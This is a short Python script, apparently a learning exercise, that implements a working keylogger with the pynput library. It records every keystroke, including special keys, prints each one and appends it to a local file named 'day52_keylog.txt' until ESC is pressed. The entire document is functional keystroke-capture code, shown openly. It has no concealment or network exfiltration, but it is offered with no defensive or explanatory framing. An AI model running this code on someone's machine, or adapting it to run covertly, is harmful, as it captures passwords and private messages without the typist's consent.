from pynput import keyboard

# Output file
LOG_FILE = "day52_keylog.txt"

def write_to_file(content):
    with open(LOG_FILE, "a") as f:
        f.write(content)

def on_press(key):
    try:
        print(f"Key pressed: {key.char}")
        write_to_file(key.char)
    except AttributeError:
        special_key = f"[{key}]"
        print(f"Special key: {special_key}")
        write_to_file(special_key)

def on_release(key):
    if key == keyboard.Key.esc:
        print("\nStopping keylogger...")
        return False  # Stop listener

# Start listening
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started... (Press ESC to stop)")
    listener.join()
